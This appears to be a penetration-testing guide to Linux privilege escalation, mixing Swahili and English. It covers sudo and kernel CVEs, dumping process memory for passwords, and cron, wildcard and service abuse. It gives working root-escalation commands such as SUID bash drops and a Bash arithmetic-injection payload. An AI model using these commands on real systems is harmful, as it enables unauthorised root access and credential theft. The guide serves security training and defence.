# Linux Privilege Escalation

Kwa maelezo mapana zaidi ya msingi na workflows za kihistoria za enumeration, linganisha rasilimali za g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation, na linux-private-i zilizoorodheshwa kwenye marejeleo.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## System Information

### OS info

Tuanze kupata maarifa kuhusu OS inayoendesha
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa **una ruhusa za kuandika kwenye folda yoyote iliyo ndani ya variable ya `PATH`**, huenda ukaweza ku-hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Maelezo ya Env

Taarifa muhimu, passwords au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kagua version ya kernel na ikiwa kuna exploit inayoweza kutumika kufanya privilege escalation.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo hatarini na **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Tovuti nyingine ambapo unaweza kupata **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yaliyo hatarini kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana zinazoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (itekeleze KATIKA victim, hukagua exploits za kernel 2.x pekee)

Daima **tafuta kernel version kwenye Google**, huenda kernel version yako imeandikwa kwenye kernel exploit fulani, na hivyo utahakikisha kuwa exploit hii ni halali.

Mbinu za ziada za kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Toleo la Sudo

Kulingana na matoleo ya sudo yenye udhaifu yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo linaathiriwa kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Matoleo ya Sudo yaliyo kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) yanawaruhusu local users wasio na privileges kuongeza privileges zao hadi root kupitia option ya sudo `--chroot` wakati faili ya `/etc/nsswitch.conf` inatumiwa kutoka kwenye directory inayodhibitiwa na user.<sup>[[28]](#references)[[29]](#references)</sup>

Hii hapa ni [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya ku-exploit [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) hiyo. Kabla ya kuendesha exploit, hakikisha kwamba version yako ya `sudo` iko vulnerable na kwamba ina-support feature ya `chroot`.

Kwa maelezo zaidi, rejelea [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) ya awali.<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo kabla ya 1.9.17p1 (range iliyoripotiwa kuathirika: **1.8.8–1.9.17**) inaweza kutathmini host-based sudoers rules kwa kutumia **user-supplied hostname** kutoka `sudo -h <host>` badala ya **real hostname**. Ikiwa sudoers inatoa privileges pana zaidi kwenye host nyingine, unaweza **ku-spoof** host hiyo locally.<sup>[[29]](#references)</sup>

Mahitaji:
- Version ya sudo iliyo vulnerable
- Host-specific sudoers rules (host si current hostname wala `ALL`)

Mfano wa sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit kwa kuspoof host iliyoruhusiwa:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Ikiwa utatuzi wa jina lililoghushiwa utakwama, liongeze kwenye `/etc/hosts` au tumia jina la hosti ambalo tayari linaonekana kwenye logs/configs ili kuepuka DNS lookups.

#### sudo < v1.8.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inavyoweza ku-exploitishwa
```bash
dmesg 2>/dev/null | grep "signature"
```
### Uchunguzi zaidi wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

If you are inside a container, anza na sehemu ifuatayo ya container-security kisha pivot kwenye kurasa za matumizi mabaya mahususi za runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Drives

Angalia **kilichomountiwa na kilicho-unmountiwa**, wapi na kwa nini. Ikiwa kuna kitu kilicho-unmountiwa, unaweza kujaribu kukimount na kuangalia taarifa za faragha
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **compiler yoyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit, kwa kuwa inashauriwa kuicompile kwenye mashine utakayoitumia (au mashine inayofanana nayo).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Hatarishi Zilizosakinishwa

Kagua **toleo la packages na services zilizosakinishwa**. Huenda kuna toleo la zamani la Nagios, kwa mfano, ambalo linaweza kutumiwa kwa exploit ili kufanya privilege escalation…\
Inapendekezwa ukague mwenyewe toleo la software zilizosakinishwa ambayo inatia shaka zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If una SSH access kwenye machine, unaweza pia kutumia **openVAS** kuangalia software zilizowekwa ndani ya machine ambazo zimepitwa na wakati au zina vulnerabilities.

> [!NOTE] > _Kumbuka kwamba commands hizi zitaonyesha taarifa nyingi ambazo kwa kiasi kikubwa hazitakuwa na manufaa; kwa hiyo inapendekezwa kutumia applications kama OpenVAS au nyingine zinazofanana, ambazo zitaangalia ikiwa version yoyote ya software iliyowekwa ina vulnerabilities zinazoweza kutumiwa na exploits zinazojulikana._

## Processes

Chunguza **processes** zinazotekelezwa na uangalie ikiwa process yoyote ina **privileges nyingi kuliko inavyopaswa kuwa nazo** (labda tomcat inayotekelezwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Daima angalia kama kuna [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) wanaoendesha, unaweza kuitumia vibaya ili kuongeza privileges. **Linpeas** hugundua hizo kwa kuangalia parameter ya `--inspect` ndani ya command line ya process.\
Pia **angalia privileges zako dhidi ya binaries za processes**, huenda ukaweza kuandika juu ya binary inayotumiwa na mtu mwingine.

### Mnyororo wa parent-child kati ya users tofauti

Child process inayoendesha chini ya **user tofauti** na parent wake si lazima iwe malicious, lakini ni **triage signal** muhimu. Baadhi ya mabadiliko hayo yanatarajiwa (`root` kuanzisha service user, login managers kuunda session processes), lakini minyororo isiyo ya kawaida inaweza kufichua wrappers, debug helpers, persistence, au mipaka dhaifu ya runtime trust.

Ukaguzi wa haraka:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Ukigundua chain ya kushangaza, kagua command line ya parent na faili zote zinazoathiri tabia yake (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Katika njia kadhaa halisi za privesc, child yenyewe haikuwa writable, bali **config inayodhibitiwa na parent** au helper chain ndiyo iliyokuwa writable.

### Executables zilizofutwa na faili zilizofutwa lakini bado zimefunguliwa

Runtime artifacts mara nyingi bado zinapatikana **baada ya kufutwa**. Hii ni muhimu kwa privilege escalation na pia kwa kurejesha ushahidi kutoka kwa process ambayo tayari imefungua faili nyeti.

Kagua executables zilizofutwa:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Ikiwa `/proc/<PID>/exe` inaelekeza kwenye `(deleted)`, process bado inaendesha old binary image kutoka kwenye memory. Hii ni signal muhimu ya kufanya uchunguzi kwa sababu:

- executable iliyoondolewa inaweza kuwa na strings au credentials zinazovutia
- process inayoendelea kuendesha inaweza bado kufichua file descriptors muhimu
- binary ya privileged iliyofutwa inaweza kuashiria tampering ya hivi karibuni au jaribio la cleanup

Kusanya deleted-open files kimataifa:
```bash
lsof +L1
```
Ukigundua descriptor ya kuvutia, irejeshe moja kwa moja:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Hii ni muhimu hasa wakati process bado ina secret, script, database export, au flag file iliyofutwa ikiwa wazi.

### Ufuatiliaji wa process

Unaweza kutumia tools kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia processes. Hii inaweza kuwa muhimu sana kutambua processes zilizo vulnerable zinazotekelezwa mara kwa mara au wakati seti fulani ya mahitaji inapotimizwa.

### Memory ya process

Baadhi ya services za server huhifadhi **credentials katika clear text ndani ya memory**.\
Kwa kawaida utahitaji **root privileges** ili kusoma memory ya processes zinazomilikiwa na users wengine, hivyo hii huwa muhimu zaidi unapokuwa tayari root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama regular user unaweza kusoma memory ya processes unazomiliki**.

> [!WARNING]
> Kumbuka kwamba siku hizi machines nyingi **haziruhusu ptrace kwa default**, jambo linalomaanisha kwamba huwezi kufanya dump ya processes nyingine zinazomilikiwa na unprivileged user wako.
>
> File _**/proc/sys/kernel/yama/ptrace_scope**_ hudhibiti accessibility ya ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: processes zote zinaweza kuwa debugged, mradi ziwe na uid sawa. Hii ndiyo njia ya classical ambayo ptracing ilifanya kazi.
> - **kernel.yama.ptrace_scope = 1**: process ya parent pekee ndiyo inaweza kuwa debugged.
> - **kernel.yama.ptrace_scope = 2**: Ni admin pekee anayeweza kutumia ptrace, kwa kuwa inahitaji capability ya CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna processes zinazoweza kufuatiliwa kwa ptrace. Ikiwekwa, reboot inahitajika ili kuwezesha ptracing tena.

#### GDB

Ikiwa una access kwenye memory ya FTP service (kwa mfano), unaweza kupata Heap na kutafuta credentials ndani yake.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa process ID fulani, **maps huonyesha jinsi memory ilivyomap ndani ya** virtual address space **ya process hiyo**; pia huonyesha **permissions za kila region iliyomap**. Faili pseudo **mem hufichua memory yenyewe ya process**. Kutoka kwenye faili ya **maps** tunajua ni **memory regions zipi zinaweza kusomeka** pamoja na offsets zake. Tunatumia taarifa hii **ku-seek ndani ya faili ya mem na ku-dump regions zote zinazoweza kusomeka** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji wa memory ya **physical** ya mfumo, si memory ya virtual. Nafasi ya anwani ya virtual ya kernel inaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa na **root** na kundi la **kmem** pekee.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump ni toleo la Linux lililoundwa upya la zana ya kawaida ya ProcDump kutoka kwenye mkusanyiko wa zana wa Sysinternals kwa Windows. Ipate kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili kudump memory ya process, unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa manually mahitaji ya root na kudump process inayomilikiwa na wewe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Credentials kutoka kwenye Process Memory

#### Mfano wa manually

Ukigundua kuwa authenticator process inaendelea:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza kufanya dump ya process (tazama sehemu zilizotangulia ili kupata njia mbalimbali za kufanya dump ya memory ya process) na kutafuta credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) ita **iba credentials zilizo katika plain text kutoka kwenye memory** na kutoka kwenye **well known files**. Inahitaji root privileges ili ifanye kazi ipasavyo.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Kazi zilizopangwa/Cron

### Crontab UI (alseambusher) inaendeshwa kama root – web-based scheduler privesc

Ikiwa paneli ya web ya “Crontab UI” (alseambusher/crontab-ui) inaendeshwa kama root na imefungwa kwenye loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda job yenye privileged ili kufanya privesc.<sup>[[1]](#references)[[4]](#references)</sup>

Mlolongo wa kawaida
- Gundua port iliyofungwa kwenye loopback pekee (kwa mfano, 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials katika operational artifacts:
- Backups/scripts zenye `zip -P <password>`
- systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tengeneza tunnel na uingie:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda kazi yenye privileges za juu na uiendeshe mara moja (inaacha SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Itumie:
```bash
/tmp/rootshell -p   # root shell
```
Uimarishaji
- Usiendeshe Crontab UI kama root; iweke chini ya user maalum na upe permissions za chini kabisa
- Funga kwenye localhost na pia zuia access kupitia firewall/VPN; usitumie tena passwords
- Epuka kuweka secrets ndani ya unit files; tumia secret stores au EnvironmentFile inayoweza kusomwa na root pekee
- Wezesha audit/logging kwa ajili ya on-demand job executions

Kagua ikiwa kuna scheduled job yoyote iliyo vulnerable. Labda unaweza kutumia script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha files ambazo root hutumia? kutumia symlinks? kuunda files maalum kwenye directory ambayo root hutumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Ikiwa `run-parts` inatumika, angalia ni majina gani yatatekelezwa kwa hakika:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Hii huepuka false positives. Directory ya periodic inayoweza kuandikwa ni muhimu tu ikiwa jina la faili yako ya payload linalingana na rules za ndani za `run-parts`.

### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi user "user" alivyo na writing privileges juu ya /home/user_)

Ikiwa ndani ya crontab hii user root anajaribu kutekeleza command au script bila kuweka path. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata root shell kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron kwa kutumia script iliyo na wildcard (Wildcard Injection)

Ikiwa script inaendeshwa na root na ina “**\***” ndani ya command, unaweza kutumia hili kusababisha mambo yasiyotarajiwa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imetanguliwa na path kama** _**/some/path/\***_ **, si vulnerable (hata** _**./\***_ **si vulnerable).**

Soma ukurasa ufuatao kwa tricks zaidi za wildcard exploitation:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection katika cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa root cron/parser inasoma log fields zisizoaminika na kuziingiza katika arithmetic context, attacker anaweza kuingiza command substitution $(...) inayotekelezwa kama root wakati cron inaendeshwa.<sup>[[22]](#references)</sup>

- Kwa nini inafanya kazi: Katika Bash, expansions hufanyika kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Kwa hiyo value kama `$(/bin/bash -c 'id > /tmp/pwn')0` inasubstitutiwa kwanza (ikiendesha command), kisha numeric `0` inayobaki inatumika kwa arithmetic ili script iendelee bila errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Fanya attacker-controlled text iandikwe kwenye log inayoparsiwa ili numeric-looking field iwe na command substitution na imalizike kwa digit. Hakikisha command yako hai-print kwenye stdout (au i-redirect) ili arithmetic ibaki valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Kuandika upya cron script na symlink

Ikiwa **unaweza kurekebisha cron script** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambayo una access kamili**, huenda ikawa muhimu kufuta folder hiyo na **kuunda symlink folder kuelekea nyingine** inayotumia script inayodhibitiwa na wewe
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Uthibitishaji wa symlink na ushughulikiaji salama wa faili

Wakati wa kukagua scripts/binaries zenye privileges zinazosoma au kuandika faili kwa path, thibitisha jinsi links zinavyoshughulikiwa:

- `stat()` hufuata symlink na kurejesha metadata ya target.
- `lstat()` hurejesha metadata ya link yenyewe.
- `readlink -f` na `namei -l` husaidia kutatua target ya mwisho na kuonyesha permissions za kila sehemu ya path.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Kwa defenders/developers, mifumo salama zaidi dhidi ya mbinu za symlink ni pamoja na:

- `O_EXCL` pamoja na `O_CREAT`: hushindwa ikiwa path tayari ipo (huzuia links/files zilizoundwa awali na attacker).
- `openat()`: hufanya kazi relative to trusted directory file descriptor.
- `mkstemp()`: huunda temporary files atomically zikiwa na secure permissions.

### Custom-signed cron binaries with writable payloads
Blue teams wakati mwingine "husaini" cron-driven binaries kwa kudump custom ELF section na kutafuta vendor string kabla ya kuzitekeleza kama root. Ikiwa binary hiyo inaweza kuandikwa na group (kwa mfano, `/opt/AV/periodic-checks/monitor` inayomilikiwa na `root:devs 770`) na unaweza ku-leak signing material, unaweza ku-forge section na hijack cron task:<sup>[[2]](#references)</sup>

1. Tumia `pspy` kunasa verification flow. Katika Era, root aliendesha `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ikifuatiwa na `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, kisha aka-execute file hiyo.
2. Tengeneza upya certificate inayotarajiwa ukitumia leaked key/config (kutoka `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Tengeneza replacement hasidi (kwa mfano, drop SUID bash, ongeza SSH key yako) na embed certificate ndani ya `.text_sig` ili grep ipite:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite scheduled binary huku ukihifadhi execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Subiri cron run inayofuata; signature check dhaifu ikifaulu, payload yako ita-run kama root.

### Frequent cron jobs

Unaweza ku-monitor processes ili kutafuta processes zinazo-execute kila baada ya dakika 1, 2 au 5. Huenda ukaweza kutumia fursa hiyo na ku-escalate privileges.

Kwa mfano, ili **ku-monitor kila 0.1s kwa dakika 1**, **kupanga kwa kuanzia commands zilizotekelezwa mara chache zaidi** na kufuta commands zilizotekelezwa mara nyingi zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayoanzishwa).

### Backups za root zinazohifadhi mode bits zilizowekwa na attacker (pg_basebackup)

Ikiwa cron inayomilikiwa na root inatumia `pg_basebackup` (au recursive copy yoyote) dhidi ya database directory ambayo unaweza kuiandikia, unaweza kuweka **SUID/SGID binary** ambayo itanakiliwa tena kama **root:root** ikiwa na mode bits zilezile kwenye backup output.<sup>[[26]](#references)</sup>

Mtiririko wa kawaida wa discovery (kama low-priv DB user):
- Tumia `pspy` kugundua root cron inayotumia kitu kama `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` kila dakika.
- Thibitisha kuwa source cluster (kwa mfano, `/var/lib/postgresql/14/main`) inaweza kuandikiwa na wewe na destination (`/opt/backups/current`) inakuwa owned na root baada ya job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Hii hufanya kazi kwa sababu `pg_basebackup` huhifadhi bits za mode ya faili wakati wa kunakili cluster; inapoendeshwa na root, faili za destination hurithi **umiliki wa root + SUID/SGID zilizochaguliwa na mshambuliaji**. Routine yoyote kama hiyo ya privileged backup/copy inayohifadhi permissions na kuandika kwenye eneo linaloweza ku-execute iko katika hatari.

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob **kwa kuweka carriage return baada ya comment** (bila newline character), na cron job itafanya kazi. Mfano (zingatia carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Ili kugundua stealth entry ya aina hii, kagua faili za cron kwa kutumia tools zinazoonyesha control characters:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Huduma

### _.service_ files Zinazoweza Kuandikwa

Kagua ikiwa unaweza kuandika kwenye faili lolote la `.service`; ikiwa unaweza, **unaweza kulibadilisha** ili **litekeleze** **backdoor yako wakati** huduma **inapoanzishwa**, **inapoanzishwa upya** au **inaposimamishwa** (huenda ukahitaji kusubiri hadi mashine iwashwe upya).\
Kwa mfano, unda backdoor yako ndani ya faili la .service kwa kutumia **`ExecStart=/tmp/script.sh`**

### Binaries za huduma Zinazoweza Kuandikwa

Kumbuka kwamba ikiwa una **ruhusa za kuandika kwenye binaries zinazotekelezwa na huduma**, unaweza kuzibadilisha ziwe backdoors ili huduma zitakapotekelezwa tena, backdoors zitekelezwe.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumiwa na **systemd** kwa:
```bash
systemctl show-environment
```
Ukigundua kuwa unaweza **kuandika** katika folda yoyote ya njia hiyo, huenda ukaweza **kuongeza mapendeleo**. Unahitaji kutafuta **relative paths zinazotumiwa katika faili za service configuration** kama vile:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
